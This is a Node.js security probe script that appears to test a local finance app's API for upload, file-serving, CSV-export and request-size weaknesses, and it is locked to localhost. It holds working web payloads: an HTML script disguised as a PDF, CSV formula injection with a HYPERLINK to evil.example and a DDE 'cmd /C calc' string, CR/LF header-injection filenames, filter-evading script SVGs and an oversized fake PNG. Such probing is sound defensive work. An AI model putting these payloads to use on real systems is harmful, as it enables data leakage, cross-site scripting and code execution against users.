// Input probe 4: uploads, served files, CSV formula injection, request size. LOCAL STACK ONLY, demo data only.
// Usage: node docs/security/probes/input-files.mjs [apiUrl]
const API = process.argv[2] ?? 'http://localhost:4000';
if (!/^http:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/.test(API)) { console.log('refusing: local stack only'); process.exit(2); }
const raw = async (method, path, body, token) => fetch(API + path, { method, headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) }, body: body === undefined ? undefined : (typeof body === 'string' ? body : JSON.stringify(body)) });
const call = async (method, path, body, token) => { const res = await raw(method, path, body, token); const t = await res.text(); let j; try { j = JSON.parse(t); } catch { j = t; } return { status: res.status, json: j, headers: res.headers, text: t }; };
const login = async (phone) => (await call('POST', '/auth/otp/verify', { phone, code: '123456' })).json.token;
const owner = await login('0700000001'), treas = await login('0700000002'), hope = await login('0700000005'), admin = await login('0700000099');
const out = []; const note = (tag, msg) => out.push(`${tag.padEnd(5)} ${msg}`);
const b64 = (s) => Buffer.from(s).toString('base64');
const today = new Date().toISOString().slice(0, 10);

// ---- 1. type decided by client mime only: an HTML/script payload labelled application/pdf is stored and served back
const setup = (await call('GET', '/expenses/setup', undefined, treas)).json; const cat = setup?.categories?.[0]?.id;
const html = '<html><body><script>document.title="PWNED"</script></body></html>';
const ex = await call('POST', '/expenses', { branchId: 'br_grc001', date: today, amount: 5, categoryId: cat, payee: '=HYPERLINK("http://evil.example/?x="&A1,"click")', note: '@SUM(1+1)*cmd|\' /C calc\'!A0', method: 'cash', files: [{ name: 'receipt.pdf', mime: 'application/pdf', data: b64(html) }] }, treas);
note(ex.status < 300 ? 'FLAG' : 'ok', `receipt: HTML bytes labelled application/pdf -> HTTP ${ex.status}${ex.status < 300 ? ' ACCEPTED (no magic-byte check)' : ' ' + JSON.stringify(ex.json).slice(0, 80)}`);
if (ex.status < 300) {
  const d = (await call('GET', `/expenses/${ex.json.id}`, undefined, treas)).json; const fid = d.fileList?.[0]?.id;
  const f = await raw('GET', `/expenses/${ex.json.id}/files/${fid}`, undefined, treas);
  note('info', `served file headers: content-type=${f.headers.get('content-type')} disposition=${f.headers.get('content-disposition')} nosniff=${f.headers.get('x-content-type-options')} csp=${f.headers.get('content-security-policy')} (mime stays in the allowlist so HTML/SVG cannot be served as text/html)`);
}
// disallowed types
for (const mime of ['text/html', 'image/svg+xml', 'application/javascript', 'application/pdf; charset=x', 'IMAGE/PNG', 'image/png\r\nX-Evil: 1']) {
  const r = await call('POST', '/expenses', { branchId: 'br_grc001', date: today, amount: 5, categoryId: cat, payee: 'probe', method: 'cash', files: [{ name: 'a', mime, data: b64('x') }] }, treas);
  note(r.status < 300 ? 'FLAG' : 'ok', `receipt mime ${JSON.stringify(mime)} -> HTTP ${r.status}`);
}
// ---- 2. KYC filename with CR/LF and non-latin characters: header injection / unhandled error when the admin opens the file
for (const fn of ['evil\r\nSet-Cookie: a=b.pdf', 'naïve—名前.pdf', 'a"; filename*=UTF-8\'\'x.html']) {
  const up = await call('POST', '/kyc/documents', { type: 'kra_pin', mime: 'application/pdf', filename: fn, data: b64('%PDF-1.4 probe') }, hope);
  if (up.status >= 300) { note('info', `kyc upload filename ${JSON.stringify(fn).slice(0, 30)} -> HTTP ${up.status} ${JSON.stringify(up.json).slice(0, 70)}`); continue; }
  const docs = (await call('GET', '/admin/kyc/documents', undefined, admin)).json; const list = Array.isArray(docs) ? docs : docs.documents ?? [];
  const mine = list.find((d) => d.id === up.json.id);
  const f = await raw('GET', `/admin/kyc/documents/${up.json.id}/file`, undefined, admin);
  note(f.status >= 500 ? 'FLAG' : f.headers.get('set-cookie') ? 'FLAG' : 'ok', `kyc filename ${JSON.stringify(fn).slice(0, 34)} -> upload ${up.status}, admin view HTTP ${f.status}, content-disposition=${JSON.stringify(f.headers.get('content-disposition'))}${mine ? '' : ' (doc not in list)'}`);
}
// ---- 3. image header-only validation: a tiny file that declares a gigantic size is accepted as poster (served publicly)
const crc = (() => { const t = []; for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t.push(c >>> 0); } return (buf) => { let c = 0xffffffff; for (const x of buf) c = t[(c ^ x) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; }; })();
const chunk = (type, data) => { const o = Buffer.alloc(12 + data.length); o.writeUInt32BE(data.length, 0); o.write(type, 4, 'ascii'); data.copy(o, 8); o.writeUInt32BE(crc(o.subarray(4, 8 + data.length)), 8 + data.length); return o; };
const fakePng = (w, h) => { const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2; return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', Buffer.from('not really image data')), chunk('IEND', Buffer.alloc(0))]); };
const ev = await call('POST', '/events', { title: 'XSSMARK poster probe', location: 'x', description: 'x', startsAt: new Date(Date.now() + 5 * 86400_000).toISOString(), audience: { type: 'org' } }, owner);
if (ev.status < 300) {
  const big = fakePng(64000, 36000); // 16:9, declares 2.3 gigapixels, file is ~100 bytes
  const r = await call('POST', `/events/${ev.json.id}/poster`, { image: { mime: 'image/png', data: big.toString('base64') } }, owner);
  note(r.status < 300 ? 'FLAG' : 'ok', `poster declaring 64000x36000 px in a ${big.length}-byte file -> HTTP ${r.status}${r.status < 300 ? ' ACCEPTED (no maximum dimension, no decode check; served to anonymous visitors)' : ' ' + JSON.stringify(r.json).slice(0, 80)}`);
}
// ---- 4. SVG logo blacklist (certificate template) accepts script-capable SVG that avoids the regex
const tpl = (await call('GET', '/certificates/template', undefined, owner)).json;
const svgs = { 'animate href=javascript&#58;': '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="x"><animate attributeName="href" values="javascript&#58;alert(1)"/><text y="20">x</text></a></svg>',
  'set attributeName=onmouseover': '<svg xmlns="http://www.w3.org/2000/svg"><rect width="50" height="50"><set attributeName="onmouseover" to="alert(1)"/></rect></svg>',
  'plain <script> (must be refused)': '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' };
for (const [label, svg] of Object.entries(svgs)) {
  const r = await call('PUT', '/certificates/template', { config: tpl.config, logo: { mime: 'image/svg+xml', data: b64(svg) } }, owner);
  note(r.status < 300 && !/must be refused/.test(label) ? 'FLAG' : 'ok', `svg logo ${label} -> HTTP ${r.status}`);
}
await call('PUT', '/certificates/template', { config: tpl.config, logo: null }, owner); // restore: no logo
// ---- 5. CSV / formula injection in exports (no leading-character neutralisation in routes/helpers.ts csv())
const exp = await call('GET', '/expenses?csv=1', undefined, treas);
const lines = String(exp.text).split('\n').filter((l) => /HYPERLINK|SUM\(1/.test(l));
note(lines.length ? 'FLAG' : 'info', `expenses CSV export (HTTP ${exp.status}, content-type ${exp.headers.get('content-type')}): ${lines.length} row(s) start a cell with = or @ unescaped: ${lines[0]?.slice(0, 110) ?? ''}`);
// ---- 6. request size: 6 MB body limit applies to unauthenticated routes as well
for (const mb of [5.5, 6.5]) {
  const t0 = Date.now(); const r = await raw('POST', '/public/give', JSON.stringify({ code: 'GRC001', pad: 'a'.repeat(Math.floor(mb * 1024 * 1024)) }));
  note('info', `unauthenticated POST /public/give with a ${mb} MB body -> HTTP ${r.status} in ${Date.now() - t0} ms (no rate limit plugin; each accepted body is parsed)`);
}
// ---- 7. unbounded free-text lengths (up to the 6 MB body) on staff routes
const long = 'n'.repeat(1_000_000);
for (const [label, p, b, tok] of [['POST /cash note 1 MB', '/cash', { branchId: 'br_grc001', amount: 1, purpose: 'OFFERING', note: long }, treas], ['POST /projects description 1 MB', '/projects', { branchId: 'br_grc001', code: 'LNG' + Math.random().toString(36).slice(2, 6).toUpperCase(), name: 'probe', description: long, target: 100 }, owner]]) {
  const r = await call('POST', p, b, tok); note(r.status < 300 ? 'FLAG' : 'ok', `${label} -> HTTP ${r.status}${r.status < 300 ? ' stored without a length limit' : ''}`);
}
console.log(out.join('\n'));
